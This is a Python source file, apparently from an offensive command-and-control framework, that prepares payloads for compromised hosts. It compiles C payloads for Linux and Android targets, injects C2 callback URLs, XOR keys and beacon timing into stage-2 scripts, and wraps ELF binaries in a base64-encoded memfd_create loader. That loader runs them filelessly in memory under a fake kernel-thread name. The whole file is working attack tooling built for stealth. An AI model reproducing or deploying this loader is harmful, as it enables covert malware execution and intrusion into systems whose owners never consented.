import os
import base64
import importlib.util
import subprocess
import sys
import ast
import gc
from .database import DatabaseManagment

class SessionLoader:
    @staticmethod
    def _resolve_index(target_input):
        """Attempts to resolve a search index or relative path to an absolute file path."""
        if os.path.exists(target_input):
            return target_input
            
        parts = str(target_input).strip().lower().split()
        index = None
        
        # Match forms like "payload 1" or just "1"
        if len(parts) == 2 and parts[0] in ['exploit', 'payload', 'recon', 'loadable'] and parts[1].isdigit():
            index = int(parts[1])
        elif len(parts) == 1 and parts[0].isdigit():
            index = int(parts[0])
            
        if index is not None:
            resolved_path = None
            
            # Ultimate Failsafe: Intercept the search module directly to reproduce the exact list the user saw.
            import io
            import sys
            
            captured_output = io.StringIO()
            old_stdout = sys.stdout
            sys.stdout = captured_output
            
            old_write = None
            try:
                from core.ToStdOut import ToStdout
                old_write = ToStdout.write
                ToStdout.write = lambda msg: captured_output.write(str(msg) + '\n')
            except Exception:
                pass
                
            try:
                from core.search import Search
                Search.search("search loadable")
            except Exception:
                pass
            finally:
                sys.stdout = old_stdout
                if old_write:
                    try:
                        from core.ToStdOut import ToStdout
                        ToStdout.write = old_write
                    except Exception:
                        pass
                        
            output = captured_output.getvalue()
            
            for line in output.split('\n'):
                line = line.strip()
                search_prefix = f"{index}:"
                if line.startswith(search_prefix):
                    path_part = line[len(search_prefix):].strip()
                    # Strip off metadata like [None] or [CVE-2017-0144]
                    clean_path = path_part.split(' [')[0].strip()
                    
                    if os.path.exists(clean_path):
                        resolved_path = clean_path
                        break
                
            if resolved_path:
                print(f"[*] Resolved Index [{index}] -> {resolved_path}")
                return resolved_path
            else:
                print(f"[-] No active search results found for index {index}. Run 'search' first.")
                return target_input
                
        # Fallback: Check if it's a relative path from the framework installation directory
        try:
            install_dir = DatabaseManagment.getInstall()
            full_path = os.path.join(install_dir, target_input)
            if os.path.exists(full_path):
                return full_path
        except Exception:
            pass
            
        return target_input

    @staticmethod
    def load(file_path):
        """
        Intelligently detects file types and returns a Python eval() loader string.
        Returns a tuple: (loader_string, function_name_to_trigger)
        """
        file_path = SessionLoader._resolve_index(file_path)

        if not os.path.exists(file_path):
            raise FileNotFoundError(f"File not found: {file_path}")
            
        ext = os.path.splitext(file_path)[1].lower()
        
        if ext == '.py':
            return SessionLoader._load_python(file_path)
        elif ext == '.c':
            return SessionLoader._load_c(file_path)
        else:
            # Treat everything else (.elf, .bin, .out, or no extension) as a compiled binary
            return SessionLoader._load_elf(file_path)
            
    @staticmethod
    def _load_c(file_path):
        """Compiles C source code into a temporary ELF binary before loading."""
        print(f"\n[*] --- Analyzing C Source Payload ---")
        print(f"[*] File: {os.path.basename(file_path)}")
        
        bin_path = file_path.replace('.c', '.out')

        # Cross-platform compilation logic
        compiler = 'gcc'
        is_android = '/android/' in file_path.lower()

        if is_android:
            # Attempt to locate Android NDK Clang within the Buildozer environment
            ndk_compiler = None
            buildozer_root = os.path.expanduser("~/.buildozer")
            if os.path.exists(buildozer_root):
                import glob
                # Search for the LLVM toolchain bin directory
                pattern = os.path.join(buildozer_root, "android/platform/android-ndk-*/toolchains/llvm/prebuilt/*/bin/aarch64-linux-android*-clang")
                matches = glob.glob(pattern)
                if matches:
                    # Prefer the latest API version if multiple exist
                    ndk_compiler = sorted(matches, reverse=True)[0]
            
            if ndk_compiler:
                compiler = ndk_compiler
            else:
                # Fallback to standard Linux cross-compiler
                check_arm = subprocess.run(['which', 'aarch64-linux-gnu-gcc'], capture_output=True)
                if check_arm.returncode == 0:
                    compiler = 'aarch64-linux-gnu-gcc'
        
        elif sys.platform == 'darwin':
            # If we are on Mac, check if a Linux cross-compiler is installed
            check_cross = subprocess.run(['which', 'x86_64-linux-gnu-gcc'], capture_output=True)
            check_arm = subprocess.run(['which', 'aarch64-linux-gnu-gcc'], capture_output=True)
            
            if check_cross.returncode == 0:
                compiler = 'x86_64-linux-gnu-gcc'
            elif check_arm.returncode == 0:
                compiler = 'aarch64-linux-gnu-gcc'
            else:
                print("[-] Error: Linux cross-compiler not found! Cannot compile C payload on macOS for a Linux target.\n[*] Fix: brew install x86_64-linux-gnu-binutils")
                return None, None

        print(f"[*] Selected Compiler : {compiler}")
        arch = "ARM64/Android" if is_android else ("x86_64/Linux" if "x86_64" in compiler else ("ARM64/Linux" if "aarch64" in compiler else "Native"))
        print(f"[*] Target Arch       : {arch}")

        try:
            compile_proc = subprocess.run(
                [compiler, file_path, '-o', bin_path, '-lpthread'],
                capture_output=True, text=True
            )
            if compile_proc.returncode != 0:
                print(f"[-] Attacker-side compilation failed:\n{compile_proc.stderr}")
                return None, None
            
            print(f"[+] Compilation successful. Proceeding to ELF extraction...")
            return SessionLoader._load_elf(bin_path)
        finally:
            # Cleanup the attacker-side binary artifact
            if os.path.exists(bin_path):
                os.remove(bin_path)
            
    @staticmethod
    def _load_python(file_path):
        print(f"\n[*] --- Analyzing Python Payload ---")
        print(f"[*] File: {os.path.basename(file_path)}")
        
        with open(file_path, 'r') as f:
            content = f.read()
            
        # Parse AST to gather intelligence without executing it locally
        try:
            tree = ast.parse(content)
        except SyntaxError as e:
            print(f"[-] Syntax Error in payload: {e}")
            return None, None
            
        functions = [node.name for node in ast.walk(tree) if isinstance(node, ast.FunctionDef)]
        imports = [node.names[0].name for node in ast.walk(tree) if isinstance(node, ast.Import)]
        
        # Determine Entry Point and Auto-Execution
        entry_point = "None (Sequential Execution)"
        auto_exec = False
        
        # Check for typical C2 entry points
        for ep in ['add', 'run_c2', 'beacon_loop', 'Start', 'exploit']:
            if ep in functions:
                entry_point = ep
                break
                
        # Check for auto-execution blocks (e.g. if __name__ == "__main__" or checking globals())
        for node in ast.walk(tree):
            if isinstance(node, ast.If):
                for child in ast.walk(node):
                    if isinstance(child, ast.Call) and getattr(child.func, 'id', '') == entry_point:
                        auto_exec = True
                        break
                        
        print(f"[*] Defined Functions : {', '.join(functions) if functions else 'None'}")
        print(f"[*] Detected Imports  : {', '.join(imports) if imports else 'None'}")
        print(f"[*] Main Entry Point  : {entry_point}")
        print(f"[*] Auto-Execution    : {'Yes (Self-Detonating)' if auto_exec else 'No (Requires manual trigger)'}")
        print(f"[*] Payload Size      : {len(content)} bytes")
        
        # If it's a legacy Exploit/Loader Module (has exploit() or Start() and isn't a raw C2 script)
        if entry_point in ['Start', 'exploit'] and 'client_socket' not in content:
            print("[*] Type: Exploit Module (Executing locally to extract string payload...)")
            try:
                spec = importlib.util.spec_from_file_location("dynamic_loader", file_path)
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                
                if hasattr(module, 'exploit'):
                    return module.exploit(silent=True), "function"
                elif hasattr(module, 'Start'):
                    return module.Start(silent=True), "function"
            except Exception as e:
                print(f"[-] Failed to execute local module: {e}")
                return None, None
                
        print("[*] Type: Raw Fileless Stage 2 Script")
        
        # --- DYNAMIC CONFIGURATION INJECTION ---
        # Look for the C2_URL and XOR_KEY variables in the script and overwrite them
        # with the current values from the framework's database before deploying.
        try:
            db = DatabaseManagment.get()
            # Resolve C2 URL (Fallback to http://LHOST:LPORT if STAGE2URL is missing)
            stage2url = db.get("STAGE2URL", "")
            if not stage2url:
                lhost = db.get("LHOST", db.get("L_HOST", "127.0.0.1"))
                lport = db.get("LPORT", db.get("L_PORT", "8000"))
                
                # OPSEC: Prevent 0.0.0.0 callback routing failures
                if lhost == "0.0.0.0":
                    try:
                        import socket
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect(("8.8.8.8", 80))
                        lhost = s.getsockname()[0]
                        s.close()
                    except Exception:
                        lhost = "127.0.0.1"
                stage2url = f"http://{lhost}:{lport}"
                
            xor_key = db.get("XOR_KEY", "SuperSploitKey")
            min_sleep = db.get("BEACON_MIN_SLEEP", "30")
            max_sleep = db.get("BEACON_MAX_SLEEP", "120")
            
            # Simple string replacement for known variable patterns
            import re
            
            # Replace C2_URL
            content = re.sub(
                r'C2_URL\s*=\s*["\'].*?["\']', 
                f'C2_URL = "{stage2url}"', 
                content
            )
            
            # Replace XOR_KEY
            content = re.sub(
                r'XOR_KEY\s*=\s*["\'].*?["\']', 
                f'XOR_KEY = "{xor_key}"', 
                content
            )
            
            # Replace MIN_SLEEP
            content = re.sub(
                r'MIN_SLEEP\s*=\s*\d+', 
                f'MIN_SLEEP = {min_sleep}', 
                content
            )
            
            # Replace MAX_SLEEP
            content = re.sub(
                r'MAX_SLEEP\s*=\s*\d+', 
                f'MAX_SLEEP = {max_sleep}', 
                content
            )
            print(f"[+] Dynamically injected configuration variables into payload.")
            print(f"    - C2_URL: {stage2url}")
            print(f"    - XOR_KEY: {xor_key}")
            print(f"    - SLEEP: {min_sleep}s to {max_sleep}s")
            
        except Exception as e:
            print(f"[-] Warning: Failed to inject dynamic configuration variables: {e}")

        print("[+] Python Payload Analysis Complete.\n")
        return content, entry_point
        
    @staticmethod
    def _load_elf(file_path):
        if not file_path.endswith('.out'):
            print(f"\n[*] --- Analyzing Compiled Binary (ELF) ---")
            print(f"[*] File: {os.path.basename(file_path)}")
            
        # Read the raw binary data
        with open(file_path, "rb") as f:
            elf_data = f.read()
            
        # Base64 encode the binary to safely transport it via the Python wrapper
        elf_b64 = base64.b64encode(elf_data).decode('utf-8')
        
        # Generate a safe, dynamic function name based on the binary's filename
        safe_name = os.path.basename(file_path).replace('.', '_').replace('-', '_').replace(' ', '_')
        func_name = f"run_{safe_name}"
        
        print(f"[*] Binary Size       : {len(elf_data)} bytes")
        print(f"[*] Delivery Method   : Base64 Encoded In-Memory Stream")
        print(f"[*] Target Execution  : Python memfd_create (Fileless)")
        print(f"[*] Auto-Execution    : Yes (Automatically launched via subprocess)")
        print(f"[*] Python Wrapper Fn : {func_name}()")
        print("[+] Binary Payload Analysis Complete.\n")
        
        # Pure-Python memfd_create wrapper
        payload = f"""
def {func_name}():
    _c = __import__('ctypes')
    _o = __import__('os')
    _s = __import__('subprocess')
    _b = __import__('base64')
    _p = __import__('platform')
    
    try:
        # Architecture-aware syscall mapping
        _arch = _p.machine()
        _sc_map = {{'x86_64': 319, 'i386': 356, 'aarch64': 279, 'arm': 385}}
        _nr = _sc_map.get(_arch, 319)

        elf_data = _b.b64decode("{elf_b64}")
        libc = _c.CDLL(None)
        proc_name = b"[kworker/u4:2]"
        
        try: fd = libc.memfd_create(proc_name, 1)
        except AttributeError: fd = libc.syscall(_nr, proc_name, 1)
        
        if fd < 0: print("[-] memfd_create failed."); return
        _o.write(fd, elf_data)
        
        # Reset offset to the beginning of the file so execve can read the ELF header
        _o.lseek(fd, 0, 0)
        
        print("[*] Launching compiled ELF from RAM (FD: " + str(fd) + ")...")
        # close_fds=False is mandatory so the child process inherits the memfd
        proc = _s.run(["/proc/self/fd/" + str(fd)], capture_output=True, text=True, close_fds=False)
        
        print("[+] Execution Complete. Output:\\n" + proc.stdout)
        if proc.stderr: print(proc.stderr)
    except Exception as e: print("[-] Loader Error: " + str(e))
"""
        # Base64 encode the entire wrapper to stream it flawlessly over the TLS socket
        encoded_payload = base64.b64encode(payload.encode()).decode()
        loader = f"exec(__import__('base64').b64decode('{encoded_payload}'))"
        
        return loader, func_name